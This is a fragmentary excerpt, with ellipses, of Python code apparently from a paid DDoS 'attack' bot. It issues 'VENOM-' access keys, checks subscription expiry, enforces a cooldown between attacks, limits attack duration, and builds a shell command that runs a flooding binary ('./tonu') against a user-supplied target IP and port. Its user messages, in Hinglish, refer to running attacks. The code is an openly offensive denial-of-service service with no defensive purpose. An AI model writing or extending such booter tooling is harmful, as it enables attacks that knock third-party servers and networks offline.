...
def create_random_key():
    key = "VENOM-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
...
COOLDOWN_PERIOD = 100  # 1-minute cooldown
    ...
    if user_id in users and users[user_id]:  # Ensure user has valid expiration
        ...
        if user_id in last_attack_time:
            ...
            if time_since_last_attack < COOLDOWN_PERIOD:
                ...
                response = f"⌛️ 𝗥𝘂𝗸 𝗷𝗮 𝗯𝗵𝗮𝗶 𝗲𝗸 𝗮𝘁𝘁𝗮𝗰𝗸 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗵𝗮𝗹 𝗿𝗮𝗵𝗮 𝗵𝗮𝗶 {int(remaining_cooldown)} 𝗶𝘁𝗻𝗮 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗸𝗲 𝗯𝗮𝗮𝗱 𝗱𝘂𝘀𝗿𝗮 𝗮𝘁𝘁𝗮𝗰𝗸 𝗹𝗮𝗴𝗮𝗴𝗮"
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./tonu {target} {port} {attack_time} 400"  # ✅ Correct variable name
